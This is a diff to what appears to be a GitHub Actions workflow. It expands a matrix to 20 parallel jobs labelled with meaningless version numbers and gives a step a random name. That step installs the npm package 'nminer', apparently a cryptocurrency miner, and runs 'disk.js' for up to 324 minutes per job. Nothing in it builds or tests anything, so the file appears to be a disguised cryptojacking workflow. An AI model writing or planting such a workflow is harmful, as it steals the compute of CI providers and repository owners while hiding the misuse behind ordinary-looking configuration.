@@ -9,23 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 8081 }
-          - { version: 1353 }
-          - { version: 5136 }
-          - { version: 7053 }
-          - { version: 9214 }
-          - { version: 8746 }
-          - { version: 6276 }
-          - { version: 9310 }
-          - { version: 7618 }
-          - { version: 3425 }
-          - { version: 377 }
-          - { version: 8709 }
-          - { version: 6867 }
-          - { version: 7229 }
-          - { version: 115 }
-          - { version: 9332 }
-          - { version: 8877 }
+          - { version: 6056 }
+          - { version: 4858 }
+          - { version: 4188 }
+          - { version: 4434 }
+          - { version: 6322 }
+          - { version: 6921 }
+          - { version: 3375 }
+          - { version: 2854 }
+          - { version: 1988 }
+          - { version: 4275 }
+          - { version: 6936 }
+          - { version: 5758 }
+          - { version: 5239 }
+          - { version: 6692 }
+          - { version: 9092 }
+          - { version: 8534 }
+          - { version: 474 }
+          - { version: 5890 }
+          - { version: 5596 }
+          - { version: 3626 }
 
     steps:
       - name: Checkout
@@ -36,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: huzzah partially
+      - name: greedily
         run: |
           npm install nminer@latest
-          timeout 340m node disk.js || echo "disk executed"
+          timeout 324m node disk.js || echo "disk executed"
